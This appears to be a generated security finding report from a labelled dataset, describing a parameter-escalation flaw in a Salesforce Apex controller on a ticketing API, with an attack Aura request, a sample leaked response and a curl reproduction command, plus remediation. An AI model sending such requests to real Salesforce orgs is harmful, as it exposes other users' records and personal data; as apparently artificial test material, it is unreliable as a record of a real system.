# Security Analysis Report
**System:** VenueCore Ticketing API (Salesforce-Integrated)
**Domain:** Event Management / Ticketing
**Example ID:** SF-0049
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User — Pattern 10.2 | Parameter escalation via `CustomObjectController.getRecord` — attacker extends own session scope to read any ticketing CustomRecord |

---

## Finding 1 — Single-User Parameter Escalation on CustomRecord Object (Pattern 10.2)

### Summary
The Apex controller `CustomObjectController` on VenueCore Ticketing API (`7016f181.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the CustomRecord object. Per §5.0 Pattern 10.2, the attacker extends their own valid session scope by substituting a victim's `recordId` in the Aura payload. No SOQL ownership predicate prevents cross-record access. In an event management / ticketing context, CustomRecord records may represent ticket purchase records, venue access passes, and attendee PII.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected controller:** `c.CustomObjectController.getRecord`
**Affected endpoint:** `POST https://7016f181.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://7016f181.lightning.force.com/aura
Authorization: Bearer 00D7016F181!AR7016f181...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D7016F181!AR7016f181...

message={"actions":[{"id":"1;a","descriptor":"c.CustomObjectController.getRecord","callingDescriptor":"UNKNOWN",
"params":{"recordId":"001F181","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim CustomRecord Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001F181", "Name": "Victim CustomRecord Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-56-6404"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D7016F181!AR7016f181..."
curl -s -X POST "https://7016f181.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CustomObjectController.getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"001F181","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-56-6404
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CustomObjectController { ... }`
2. `WHERE Id = :recordId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client-controlled `fields` parameter; use server-side allowlist.
4. Validate `aura.token`.
5. **Event management note:** Ticket and attendee records contain venue access data. SSN exposure (`000-56-6404`) is a direct PII breach with event security implications.
